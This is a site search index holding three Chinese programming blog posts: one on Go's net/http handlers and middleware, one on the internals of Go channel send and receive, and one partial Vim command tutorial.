<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>初探http包——go网络服务的第一步</title>
    <url>/2020/06/03/http%E5%8C%85%E2%80%94%E2%80%94go%E7%BD%91%E7%BB%9C%E6%9C%8D%E5%8A%A1%E7%9A%84%E7%AC%AC%E4%B8%80%E6%AD%A5/</url>
    <content><![CDATA[<p>仅需几行 go 代码就可以构建一个高效的 HTTP 服务器:</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">"net/http"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    http.HandleFunc(<span class="string">"/"</span>, <span class="function"><span class="keyword">func</span><span class="params">(w http.ResponseWriter, r *http.Request)</span></span> &#123;</span><br><span class="line">       w.Write([]<span class="keyword">byte</span>(<span class="string">"hello world!"</span>))</span><br><span class="line">    &#125;)</span><br><span class="line">    http.ListenAndServe(<span class="string">":8080"</span>, <span class="literal">nil</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>然后访问 <code>127.0.0.1:8080</code> 就可以看到，一个服务器已经成功启动了（而且和 Python 等语言自带的服务器相比性能很强哦）：</p>
<p><img src="https://i.loli.net/2020/06/03/k3QcvMgNR1mr59A.png" alt="http服务器"></p>
<p>对一次 HTTP 通信，我们只需要关注客户端（client）和服务端（Server）即可。而一个 HTTP 服务器最重要的功能莫过于 <code>路由</code>，即实现一个多路选择器（multiplexer）。本文就来探索这背后的秘密。</p>
<p>先认识一下 Server 类：</p>
<p><img src="https://i.loli.net/2020/06/03/asTBZgulqdQXwco.png" alt="http.Server"></p>
<h2 id="从-Handler-说起"><a href="#从-Handler-说起" class="headerlink" title="从 Handler 说起"></a>从 Handler 说起</h2><p>Handler 是一个抽象接口，其唯一的方法是 <code>ServeHTTP(ResponseWriter, *Request)</code>。<br>实现了 Handler 接口的对象可以注册到 Server，为特定的路径及其子树提供服务。</p>
<p>下面是 http 包中实现了 Handler 的类：</p>
<p><img src="https://i.loli.net/2020/06/03/v63t1eTHROSb9dM.png" alt="Handler接口"></p>
<p>因为本包多处使用到名为 handler 的 Handler 实例，而这些实例可能拥有不同的实现，所以有必要做一个分类：</p>
<ul>
<li>handler 处理器函数：签名为 <code>func(ResponseWriter, *Request)</code> 的函数</li>
<li>handler 处理器：经过 <code>HandleFunc</code> 包装，实现了 <code>Handler</code> 接口的函数</li>
<li>handler 对象：任何实现了 <code>Handler</code> 接口的结构体</li>
</ul>
<p><img src="https://i.loli.net/2020/06/04/Y9glIrx8Ud5yfou.png" alt="Handler对象之间的关系"></p>
<h2 id="注册处理器"><a href="#注册处理器" class="headerlink" title="注册处理器"></a>注册处理器</h2><p>Server 根据请求选择合适的处理器构建响应，那么当然事先要在 Server 中把 请求-处理器 之间的关系注册好，<code>ServerMux</code> 就是负责关系请求模式串和处理器之间的关系的。</p>
<p>注册一个处理器的常用方法就是调用 <code>http.HandleFunc(pattern string, handler func(ResponseWriter, *Request))</code>，其背后的逻辑如下：</p>
<p><img src="https://i.loli.net/2020/06/03/rvLk8VzcFeJyXNw.png" alt="构建处理函数"></p>
<p><code>http.HandleFunc(pattern string, handler func(ResponseWriter, *Request))</code> 会使用 DefaultServeMux 的 <code>HandleFunc</code> 方法，该方法把 handler 处理器函数包装为 handler 处理器，然后通过 DefaultServeMux 的 <code>Handle</code> 方法把这个处理器注册到相应模式串去。这样就完成了一次 <code>模式串-处理器</code> 的注册。</p>
<p>当然，我们也可以创建一个 ServeMux 实例并调用其 <code>HandleFunc</code> 方法把处理器注册到自定义的 ServeMux 上去：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> hiHandler <span class="keyword">struct</span>&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(h *hiHandler)</span> <span class="title">ServeHTTP</span><span class="params">(w http.ResponseWriter,  r *http.Request)</span></span> &#123;</span><br><span class="line">    fmt.Fprint(w, <span class="string">"hi, world!"</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    mux := http.NewServeMux()</span><br><span class="line">    mux.HandleFunc(<span class="string">"/hello"</span>, <span class="function"><span class="keyword">func</span><span class="params">(w http.ResponseWriter, r *http.Request)</span></span> &#123;</span><br><span class="line">        fmt.Fprint(w, <span class="string">"hello world!"</span>)</span><br><span class="line">    &#125;) <span class="comment">// ServeMux.HandleFunc 需要一个 handler 处理器函数</span></span><br><span class="line">    mux.Handle(<span class="string">"/bye"</span>, http.HandleFunc(<span class="function"><span class="keyword">func</span><span class="params">(w http.ResponseWriter, r *http.Request)</span></span> &#123;</span><br><span class="line">        fmt.Fprint(w, <span class="string">"bye world!"</span>)</span><br><span class="line">    &#125;)) <span class="comment">// 把一个 handler 处理器函数包装成一个 handler 处理器</span></span><br><span class="line">    mux.Handle(<span class="string">"/hi"</span>, &amp;hiHandler&#123;&#125;) <span class="comment">// 直接给一个 handler 对象</span></span><br><span class="line">    http.ListenAndServe(<span class="string">":8080"</span>, mux) <span class="comment">// 指定 DefaultServer 使用自定义的 ServeMux</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="处理请求"><a href="#处理请求" class="headerlink" title="处理请求"></a>处理请求</h2><p>我们需要一个 Server 对各种请求进行总处理，调用 <code>http.ListenAndServe(string, Handler)</code> 会初始化一个 Server 实例，其背后逻辑如下：</p>
<p><img src="https://i.loli.net/2020/06/04/TiXUv2jkazD1HYN.png" alt="处理请求"></p>
<p>Server 会监听其 <code>Addr</code> 属性上的 TCP 连接，为每个到来的 TCP 连接创建一个 <code>http.conn</code> 作为其在服务器端的抽象。从 <code>http.conn</code> 中读取并解析 HTTP 请求，创建 <code>http.ResponseWriter</code> 作为该请求的响应的抽象，然后在 Server 的 <code>Handler</code> 字段中寻找是否指定了 ServerMux（字段为空则使用 DefaultServeMux）。最后在 ServeMux 中查找并调用相应的处理器构建 HTTP 响应。</p>
<p>Serer 当然也是可以自定义的：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    mux := NewServeMux()</span><br><span class="line">    mux.HandleFunc(<span class="string">"/hello"</span>, <span class="function"><span class="keyword">func</span><span class="params">(w http.ResponseWriter, r *http.Request)</span></span> &#123;</span><br><span class="line">        fmt.Fprint(w, <span class="string">"hello world!"</span>)</span><br><span class="line">    &#125;)</span><br><span class="line">    server := &amp;http.Server&#123; <span class="comment">// 自定义 Server 的各种属性</span></span><br><span class="line">        Handler: mux,</span><br><span class="line">        Addr: <span class="string">":8086"</span>,</span><br><span class="line">        ReadTimeout: <span class="number">1</span> * time.Second,</span><br><span class="line">        WriteTimeout: <span class="number">2</span> * time.Second,</span><br><span class="line">    &#125;</span><br><span class="line">    server.ListenAndServe()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="搞搞中间件"><a href="#搞搞中间件" class="headerlink" title="搞搞中间件"></a>搞搞中间件</h2><p>既然 handler 处理器负责对请求构建响应，而函数在 go 中又是所谓“一等公民”（可以被赋值与返回），那么我们可以对它做点文章。比如在一个处理器之外再包一层逻辑形成一个有额外行为的新处理器。</p>
<p>例如，只要我们实现了签名为 <code>func(Handler) Handler</code> 的函数，就可以额外实现一层逻辑，比如打印响应到来的时间：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    hello := <span class="function"><span class="keyword">func</span><span class="params">(w http.ResponseWriter, req *http.Request)</span></span> &#123;</span><br><span class="line">        fmt.Fprint(w, <span class="string">"hello world!"</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    timeLog := <span class="function"><span class="keyword">func</span><span class="params">(next http.Handler)</span> <span class="title">http</span>.<span class="title">Handler</span></span> &#123;</span><br><span class="line">        <span class="comment">// 构建一个新的处理器，里面包含原处理器</span></span><br><span class="line">        <span class="keyword">return</span> http.HandlerFunc(<span class="function"><span class="keyword">func</span><span class="params">(writer http.ResponseWriter, request *http.Request)</span></span> &#123;</span><br><span class="line">            log.Printf( <span class="string">"handling the request at: %v"</span>,  time.Now())</span><br><span class="line">            next.ServeHTTP(writer, request)</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;</span><br><span class="line">    http.Handle(<span class="string">"/hello"</span>, timeLog(http.HandlerFunc(hello)))</span><br><span class="line">    http.ListenAndServe(<span class="string">":8080"</span>, <span class="literal">nil</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>语言</category>
      </categories>
      <tags>
        <tag>Go</tag>
      </tags>
  </entry>
  <entry>
    <title>channel-Go的传声筒</title>
    <url>/2020/06/01/channel-Go%E7%9A%84%E4%BC%A0%E5%A3%B0%E7%AD%92/</url>
    <content><![CDATA[<p>得益于 goroutine 的设计，Go 在执行并发任务是可谓是得心应手。既然存在并发，就必然牵扯到多任务同步的问题。当然，我们可以直接用共享内存来通信（如共享变量），但是 Go 的设计哲学中有一句话叫做<code>不要用共享内存来通信，而是用通信共享内存</code>。利用内置的 channel 结构体在多个 goroutine 间通信是更安全也是更被推崇的。</p>
<p>channel 在 runtime 中用 <code>hchan</code>  结构体表示，每次创建 channel 都是创建了一个这样的结构体:</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> hchan <span class="keyword">struct</span> &#123;</span><br><span class="line">    qcount   <span class="keyword">uint</span> <span class="comment">// channel 中元素个数</span></span><br><span class="line">    dataqsiz <span class="keyword">uint</span> <span class="comment">// channel 中循环队列长度</span></span><br><span class="line">    buf      unsafe.Pointer <span class="comment">// channel 的缓冲区数据指针</span></span><br><span class="line">    elemsize <span class="keyword">uint16</span> <span class="comment">// channel 能收发的元素大小</span></span><br><span class="line">    closed   <span class="keyword">uint32</span></span><br><span class="line">    elemtype *_type <span class="comment">// channel 能够收发的元素类型</span></span><br><span class="line">    sendx    <span class="keyword">uint</span> <span class="comment">// 缓冲过区中 channel 的发送操作处理到的位置</span></span><br><span class="line">    recvx    <span class="keyword">uint</span> <span class="comment">// 缓冲区中 channel 的接收操作处理到的位置</span></span><br><span class="line">    recvq    waitq <span class="comment">// 阻塞在这个 hchan 上的接收 goroutine 队列</span></span><br><span class="line">    sendq    waitq <span class="comment">// 阻塞在这个 hchan 上的发送 goroutine 队列</span></span><br><span class="line"></span><br><span class="line">    lock mutex <span class="comment">// 解决可能的线程竞争问题，也就是说 channel 是线程安全的</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> waitq <span class="keyword">struct</span> &#123;</span><br><span class="line">    first *sudog</span><br><span class="line">    last  *sudog</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> sudog <span class="keyword">struct</span> &#123;</span><br><span class="line">    g *g</span><br><span class="line">    next     *sudog <span class="comment">// 下一个 sudog</span></span><br><span class="line">    prev     *sudog <span class="comment">// 上一个 sudong</span></span><br><span class="line">    elem     unsafe.Pointer <span class="comment">// 指向数据</span></span><br><span class="line">    c        *hchan <span class="comment">// 属于哪个 channel</span></span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="向-Channel-发送"><a href="#向-Channel-发送" class="headerlink" title="向 Channel 发送"></a>向 Channel 发送</h2><p>函数 <code>runtime.chansend</code> 负责向 channel 发送数据的全部逻辑：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">chansend</span><span class="params">(c *hchan, ep unsafe.Pointer, block <span class="keyword">bool</span>, callerpc <span class="keyword">uintptr</span>)</span> <span class="title">bool</span></span> &#123;</span><br><span class="line">    lock(&amp;c.lock)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> c.closed != <span class="number">0</span> &#123;</span><br><span class="line">        unlock(&amp;c.lock)</span><br><span class="line">        <span class="built_in">panic</span>(plainError(<span class="string">"send on closed channel"</span>))</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br></pre></td></tr></table></figure>
<p>在发送数据的逻辑执行之前会先为当前 Channel 加锁，防止发生竞争条件。如果 Channel 已经关闭，那么向该 Channel 发送数据时就会报”send on closed channel” 错误并中止程序。整个函数的执行过程可分为三部分：</p>
<ol>
<li>存在等待的接收者时，把数据直接发送给阻塞的接收者</li>
<li>存在可用缓冲区时，把数据写入缓冲区</li>
<li>不存在缓冲区或缓冲区已满时，等待其它 goroutine 从该 channel 接收数据</li>
</ol>
<h3 id="直接发送"><a href="#直接发送" class="headerlink" title="直接发送"></a>直接发送</h3><p>如果目标 Channel 没有被关闭并且已经有处于读等待的 Goroutine，那么 runtime.chansend 函数会从接收队列 recvq 中取出最先陷入等待的 Goroutine 并直接向它发送数据:</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">chansend</span><span class="params">(c *hchan, ep unsafe.Pointer, block <span class="keyword">bool</span>, callerpc <span class="keyword">uintptr</span>)</span> <span class="title">bool</span></span> &#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">if</span> sg := c.recvq.dequeue(); sg != <span class="literal">nil</span> &#123;</span><br><span class="line">        send(c, sg, ep, <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123; unlock(&amp;c.lock) &#125;, <span class="number">3</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>发送数据时调用 <code>runtime.send</code> 函数，该函数的执行可以分成两个部分：</p>
<ol>
<li>将发送的数据直接拷贝到 x = &lt;-c 表达式中变量 x 所在的内存地址上</li>
<li>将等待接收数据的 Goroutine 标记成可运行状态 Grunnable 并把该 Goroutine 放到发送方所在的处理器的 runnext 上等待执行</li>
</ol>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">send</span><span class="params">(c *hchan, sg *sudog, ep unsafe.Pointer, unlockf <span class="keyword">func</span>()</span>, <span class="title">skip</span> <span class="title">int</span>)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> sg.elem != <span class="literal">nil</span> &#123;</span><br><span class="line">        sendDirect(c.elemtype, sg, ep) <span class="comment">// 直接把数据拷贝到接收 goroutine 对应变量的内存地址</span></span><br><span class="line">        sg.elem = <span class="literal">nil</span></span><br><span class="line">    &#125;</span><br><span class="line">    gp := sg.g</span><br><span class="line">    unlock()</span><br><span class="line">    gp.param = unsafe.Pointer(sg)</span><br><span class="line">    goready(gp, skip+<span class="number">1</span>) <span class="comment">// 改变接收 goroutine 的状态，放入处理器 runnext 属性</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="发送到缓冲区"><a href="#发送到缓冲区" class="headerlink" title="发送到缓冲区"></a>发送到缓冲区</h3><p>如果创建的 Channel 包含缓冲区并且 channel 中的数据没有装满，chansend 就会执行下面这段代码：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">chansend</span><span class="params">(c *hchan, ep unsafe.Pointer, block <span class="keyword">bool</span>, callerpc <span class="keyword">uintptr</span>)</span> <span class="title">bool</span></span> &#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">if</span> c.qcount &lt; c.dataqsiz &#123;</span><br><span class="line">        qp := chanbuf(c, c.sendx) <span class="comment">// 计算出缓冲区下一个可用位置</span></span><br><span class="line">        typedmemmove(c.elemtype, qp, ep) <span class="comment">// 发送数据到缓冲区</span></span><br><span class="line">        c.sendx++ <span class="comment">// 更新缓冲区指针</span></span><br><span class="line">        <span class="keyword">if</span> c.sendx == c.dataqsiz &#123;</span><br><span class="line">            c.sendx = <span class="number">0</span> <span class="comment">// 缓冲区是一个循环队列，如果满了就指向队头</span></span><br><span class="line">        &#125;</span><br><span class="line">        c.qcount++ <span class="comment">// 更新缓冲区计数</span></span><br><span class="line">        unlock(&amp;c.lock)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="阻塞发送"><a href="#阻塞发送" class="headerlink" title="阻塞发送"></a>阻塞发送</h3><p>如果 channel 上没有等待接收的 goroutine 或缓冲区不可用，当前发送数据的 goroutine 会被阻塞并加入 channel 的发送队列。chansend 会执行下面的代码:</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">chansend</span><span class="params">(c *hchan, ep unsafe.Pointer, block <span class="keyword">bool</span>, callerpc <span class="keyword">uintptr</span>)</span> <span class="title">bool</span></span> &#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">if</span> !block &#123;</span><br><span class="line">        unlock(&amp;c.lock)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    gp := getg() <span class="comment">// 获得当前尝试向 channel 发送数据的 Goroutine</span></span><br><span class="line">    mysg := acquireSudog() <span class="comment">// 获取一个 sudog 结构体并设置相关的属性</span></span><br><span class="line">    mysg.elem = ep</span><br><span class="line">    mysg.g = gp</span><br><span class="line">    mysg.c = c</span><br><span class="line">    gp.waiting = mysg <span class="comment">// 表示当前 Goroutine 等待在 sudog 上</span></span><br><span class="line">    c.sendq.enqueue(mysg) <span class="comment">// 将准备好的 sudog 加入 channel 的发送队列</span></span><br><span class="line">    goparkunlock(&amp;c.lock, waitReasonChanSend, traceEvGoBlockSend, <span class="number">3</span>) <span class="comment">// 将当前 Goroutine 陷入沉睡并等待唤醒</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 做一些清空属性的收尾工作</span></span><br><span class="line">    gp.waiting = <span class="literal">nil</span></span><br><span class="line">    gp.param = <span class="literal">nil</span></span><br><span class="line">    mysg.c = <span class="literal">nil</span></span><br><span class="line">    releaseSudog(mysg)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p>使用 <code>ch &lt;- i</code> 向一个 channel 发送数据时：</p>
<ol>
<li>如果当前 Channel 的 recvq 上存在已经被阻塞的 Goroutine，那么会直接将数据发送给当前的 Goroutine 并将其设置成下一个运行的 Goroutine；</li>
<li>如果 Channel 存在缓冲区并且其中还有空闲的容量，我们就会直接将数据直接存储到当前缓冲区 sendx 所在的位置上；</li>
<li>如果不满足上面的两种情况，就会创建一个 runtime.sudog 结构并将其加入 Channel 的 sendq 队列中，当前 Goroutine 也会陷入阻塞等待其他的协程从 Channel 接收数据</li>
</ol>
<p>发送过程中，2 个时机会触发 Goroutine 调度：</p>
<ol>
<li>发送数据时发现 channel 上存在等待接收数据的 Goroutine，立刻设置处理器的 runnext 属性，但是并不会立刻触发调度</li>
<li>发送数据时并没有找到接收方并且缓冲区已经满了，这时就会将自己加入 Channel 的 sendq 队列并调用 runtime.goparkunlock 触发 Goroutine 的调度让出处理器的使用权</li>
</ol>
<h2 id="从-Channel-接收"><a href="#从-Channel-接收" class="headerlink" title="从 Channel 接收"></a>从 Channel 接收</h2><p>使用 <code>i &lt;- ch</code> 或 <code>i, ok &lt;- ch</code> 都可以从 channel 接收数据，不同方法在 runtime 最后都是调用 <code>runtime.chanrecv</code> 方法：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">chanrecv</span><span class="params">(c *hchan, ep unsafe.Pointer, block <span class="keyword">bool</span>)</span> <span class="params">(selected, received <span class="keyword">bool</span>)</span></span> &#123;</span><br><span class="line">    <span class="keyword">if</span> c == <span class="literal">nil</span> &#123; <span class="comment">// channel 为空（未创建对象）</span></span><br><span class="line">        <span class="keyword">if</span> !block &#123;</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 挂起当前 goroutien</span></span><br><span class="line">        gopark(<span class="literal">nil</span>, <span class="literal">nil</span>, waitReasonChanReceiveNilChan, traceEvGoStop, <span class="number">2</span>)</span><br><span class="line">        throw(<span class="string">"unreachable"</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    lock(&amp;c.lock)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> c.closed != <span class="number">0</span> &amp;&amp; c.qcount == <span class="number">0</span> &#123; <span class="comment">// 如果 channel 已经关闭并且缓冲区没有数据，直接返回</span></span><br><span class="line">        unlock(&amp;c.lock)</span><br><span class="line">        <span class="keyword">if</span> ep != <span class="literal">nil</span> &#123;</span><br><span class="line">            typedmemclr(c.elemtype, ep)</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>, <span class="literal">false</span></span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="非阻塞接收"><a href="#非阻塞接收" class="headerlink" title="非阻塞接收"></a>非阻塞接收</h3><p>当 Channel 的 sendq 队列中包含处于等待状态的 Goroutine 时，该函数会取出队列头等待的 Goroutine，处理的逻辑和发送时相差无几。</p>
<ul>
<li>如果 channel 不存在缓冲区：将 channel 发送队列 sendq 中 Goroutine 存储的 elem 数据拷贝到目标内存地址中；</li>
<li>如果 channel 存在缓冲区：<ol>
<li>将 recvx 指向的缓冲区的数据拷贝到接收方的内存地址</li>
<li>将发送队列 sendq 头的 sudog 中数据拷贝到缓冲区，释放一个阻塞的发送方<br><img src="https://i.loli.net/2020/05/25/13WoPzZrpjmYEnh.png" alt="存在缓冲区"></li>
</ol>
</li>
</ul>
<p>无论发生哪种情况，运行时都会调用 runtime.goready 函数将当前处理器的 runnext 设置成发送数据的 Goroutine，在调度器下一次调度时将阻塞的发送方唤醒。</p>
<h3 id="阻塞接收"><a href="#阻塞接收" class="headerlink" title="阻塞接收"></a>阻塞接收</h3><p>当 channel 的发送队列中不存在等待的 Goroutine 并且缓冲区中也不存在任何数据时，从管道中接收数据的操作会变成阻塞操作。当前请求接收的 Goroutine 会被包装成一个 sudog 放入该 channel 的接收等待队列 recvq，然后触发调度。</p>
<h3 id="小结-1"><a href="#小结-1" class="headerlink" title="小结"></a>小结</h3><p>从 channel 中接收数据，可能有以下 5 中情况：</p>
<ol>
<li>如果 Channel 为空，那么就会直接调用 runtime.gopark 挂起当前 Goroutine；</li>
<li>如果 Channel 已经关闭并且缓冲区没有任何数据，runtime.chanrecv 函数会直接返回；</li>
<li>如果 Channel 的 sendq 队列中存在挂起的 Goroutine，就会将 recvx 索引所在的数据拷贝到接收变量所在的内存空间上并将 sendq 队列中 Goroutine 的数据拷贝到缓冲区；</li>
<li>如果 Channel 的缓冲区中包含数据就会直接读取 recvx 索引对应的数据；</li>
<li>在默认情况下会挂起当前的 Goroutine，将 runtime.sudog 结构加入 recvq 队列并陷入休眠等待调度器的唤醒；</li>
</ol>
<p>接收过程中，2 个过程会触发 goroutine 调度：</p>
<ol>
<li>channel 为空</li>
<li>缓冲区中不存在数据并且也不存在数据的发送者</li>
</ol>
<h2 id="关闭-channel"><a href="#关闭-channel" class="headerlink" title="关闭 channel"></a>关闭 channel</h2><p>close 一个已被关闭的 channel 会导致 panic。正常情况下，<br>runtime 会清空所有 sudog 上的数据 elem，并把阻塞在这个 channel 上的 goroutine （revq 和 sendq 上的）加入调度队列触发调度。</p>
]]></content>
      <categories>
        <category>语言</category>
      </categories>
      <tags>
        <tag>Go</tag>
      </tags>
  </entry>
  <entry>
    <title>Vim 从入门到放弃</title>
    <url>/2020/05/22/Vim-%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E6%94%BE%E5%BC%83/</url>
    <content><![CDATA[<p>如果问世界上最强大的语言是什么？答案或许有很多，但是如果问世界上最强大的编辑器是什么，恐怕很多人都回答都是 Vim。笔者从入门编程的第一天开始就听说了 Vim 的大名，然而苦于一大堆眼花缭乱的命令，屡屡尝试最后都是无疾而终。最近决心一定要把玩意儿入门了，于是开始跟着官方 tutorial 学习。打开中文版官方 tutorial 命令如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vimtutor zh</span><br></pre></td></tr></table></figure>
<p>大部分 Vim 命令都可以看作三部分：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">operator [number] motion</span><br></pre></td></tr></table></figure>
<p>operator 是要执行的操作（删除、修改等），number 代表该操作重复的次数，motion 是以什么格式作为操作单位（w 代表单词，$ 代表行末等）</p>
<h2 id="移动"><a href="#移动" class="headerlink" title="移动"></a>移动</h2><p>Vim 使用 h、j、k、l 四个键是光标在左、下、上、右间移动（当然，直接使用光标键也可以）：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">     ^</span><br><span class="line">     k</span><br><span class="line">&lt;h       l&gt;</span><br><span class="line">     j</span><br><span class="line">     v</span><br></pre></td></tr></table></figure>
<p>光标在行内移动：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#w：从当前位置起移动到下 # 个单词的头部</span><br><span class="line">#b：#w 的逆操作</span><br><span class="line">#e：从当前位置其移动到第 # 个单词的尾部</span><br><span class="line">$：移动到当前行尾部</span><br><span class="line">0：移动到当前行头部</span><br><span class="line">fPattern：正向跳转到 Pattern 字符</span><br><span class="line">tPattern：反向跳转到 Pattern 字符</span><br><span class="line">%：如果当前位置是 (、)、[、]、&#123;、&#125;，将光标移动到配对的括号上</span><br><span class="line">G：移动到文件末尾</span><br><span class="line">gg：移动到文件头</span><br><span class="line">#G：移动到文件的第 # 行</span><br><span class="line">ctrl+G：显示光标在文件中的位置信息</span><br><span class="line">ctrl+o：移动到早前光标所在位置（o 表示 older）</span><br><span class="line">ctrl+i：ctrl+o 的逆操作（i 在 o 的前面）</span><br></pre></td></tr></table></figure>
<p>除了主动移动外，有时需要在文件中根据模式进行搜索：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">/Pattern：Pattern 表示模式，/ 表示向下搜索</span><br><span class="line">?Pattern：? 表示向上搜索</span><br><span class="line">执行搜索操作后，n 表示继续搜索，N 表示反方向搜索</span><br></pre></td></tr></table></figure>
<h2 id="删除"><a href="#删除" class="headerlink" title="删除"></a>删除</h2><p>当然可以进入 insert 模式后按下 Backspace 进行删除，这里讨论的是如何在 normal 模式下删除：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">x： 删除当前光标所在字符</span><br><span class="line">d#w or d#e or d#$ or d#0：d 表示删除操作，w、e、$、0 表示不同操作单位，# 表示重复次数</span><br><span class="line">dd：删除当前行</span><br><span class="line">#dd：删除 # 行</span><br><span class="line">dfPatern：从当前位置删除到 Pattern 字符</span><br><span class="line">di&quot;：删除双引号 &quot;&quot; 里面的内容</span><br><span class="line">da&quot;：删除双引号 &quot;&quot; 及其里面的内容</span><br><span class="line">shift+d：相当于 d$</span><br><span class="line">shift+s：相当于 dd</span><br><span class="line">J：相当于 dd</span><br></pre></td></tr></table></figure>
<p><code>d</code> 是一个 operator，表示删除（delete）</p>
<p>有删除就有撤销：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">u：撤销上次一命令</span><br><span class="line">U：恢复本行的原始状态（撤销左右作用在本行的命令）</span><br><span class="line">ctrl+R：u 的逆操作</span><br></pre></td></tr></table></figure>
<h2 id="复制-amp-粘贴"><a href="#复制-amp-粘贴" class="headerlink" title="复制&amp;粘贴"></a>复制&amp;粘贴</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#yy：复制 # 行</span><br><span class="line">y#w or y#e or y#$ or y#0：y 表示复制操作，w、e、$、0 表示不同操作单位，# 表示重复次数</span><br></pre></td></tr></table></figure>
<p><code>y</code> 是一个 operator，表示复制（copy）</p>
<p>选中区域进行操作：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">v 进入 visual 模式，然后用移动键（h、j、k、l）进行选择</span><br><span class="line">被选中的区域可以进行批量 d、y 操作。</span><br></pre></td></tr></table></figure>
<p>删除操作删掉的数据会保存在 vim 的缓存中，用如下命令把上一次删除的数据复制到相应位置：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#p：复制 # 次，如果被删除数据是一整行那么在光标的下一行插入</span><br></pre></td></tr></table></figure>
<h2 id="插入-amp-替换"><a href="#插入-amp-替换" class="headerlink" title="插入&amp;替换"></a>插入&amp;替换</h2><p>在行的指定区域进入 insert 模式：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">A：光标移到行末并进入 insert 模式</span><br><span class="line">a：在光标后边进入 insert 模式</span><br></pre></td></tr></table></figure>
<p>在 normal 模式下对光标指向的字符进行替换：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">rnew：当前字符替换为 new</span><br><span class="line">Rnew：连续替换多个字符，类似于原地直接修改</span><br></pre></td></tr></table></figure>
<p>如果单个字符修改不够用，可以一次修改更多。<code>c</code> 是一个 operator，表示修改（change）：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">c#w or c#e or c#$ or c#0：改变从当前位置到指定位置的所有文本，会自动进入 insert 模式</span><br></pre></td></tr></table></figure>
